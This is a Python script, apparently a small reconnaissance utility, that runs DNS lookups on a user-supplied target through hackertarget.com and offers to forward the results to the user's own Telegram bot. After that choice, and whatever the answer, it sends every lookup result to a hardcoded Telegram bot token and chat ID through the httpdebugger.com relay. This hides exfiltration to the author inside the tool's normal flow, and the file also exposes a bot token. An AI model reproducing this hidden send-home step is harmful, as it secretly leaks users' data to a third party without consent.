import requests
import socket
import os
import time
import platform
from colorama import Fore , init

#-------------------------------
clear = os.system("cls")
#-------------------------------
host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)
#-------------------------------
system = platform.system()
#-------------------------------
print(Fore.RED + "                   " + "Hi Haacker" + "                                               " + "Your operating system : ==> " + system )
Fore.RESET

print(Fore.YELLOW + "              " + "Welcome to A.D.H (DNS Lookup)" + "                                " +" Your IP address : ==> " + ip_address )
Fore.RESET
#-------------------------------
print("""
""")
#-------------------------------
Target = input( Fore.LIGHTCYAN_EX + " Your Target address : ==> ")
#-------------------------------
print("""
""")
#-------------------------------

DNS_Loockup = requests.get("https://api.hackertarget.com/dnslookup/?q=" + Target ).text
#-------------------------------
Telegram_ADH = ("https://api.telegram.org/bot1472534623:AAExK7IHhnHQC_XNGzB5YTa2TAsJswQyW-o/sendMessage?chat_id=1432957718&text=" + DNS_Loockup )
#-------------------------------
print (Fore.LIGHTRED_EX + """ ↓ ↓ DNS Lookup : ==> (""" +" "+Target+" " +""") ↓ ↓
""" +Fore.LIGHTYELLOW_EX+ DNS_Loockup)

print(Fore.LIGHTRED_EX + """ ↑ ↑ DNS Lookup : ==> (""" +" "+Target+" " +""") ↑ ↑ 
""")
#-------------------------------
Bot_Token = None
Chat_Id = None
#------------------------------
Yes_or_No = input(Fore.BLUE + " Do you want the target information to be sent to Bot Telegram ? (Y/N) ")
#-------------------------------
Yes = ("Y")
if Yes_or_No == Yes :

    #------------------------------
    Bot_Token = input(Fore.LIGHTCYAN_EX + " Your Bot Token : ==> ")
    Chat_Id = input(Fore.LIGHTCYAN_EX + " Your Chat Id : ==> ")
    #------------------------------
    Telegram = ("https://api.telegram.org/bot" + Bot_Token + "/sendMessage?chat_id=" + Chat_Id + "&text=" + DNS_Loockup )
    #------------------------------

    payload = {
        "urlbox" : Telegram ,
        "AgentList" : "Google Chrome",
        "VersionsList" : "HTTP/1.1",
        "MethodList" : "POST",
    }
    #-------------------------------

    req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",payload)
    # print (req)
    print("""
    """)
    print (Fore.GREEN + "[#] Your target information send to Telegram Bot")
else:
    # os.system("exit()")
    pass
#------------------------------
payload_ = {
        "urlbox" : Telegram_ADH ,
    "AgentList" : "Google Chrome",
    "VersionsList" : "HTTP/1.1",
    "MethodList" : "POST",
}
#-------------------------------
req_ADH = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",payload_)
print=(req_ADH)
#-------------------------------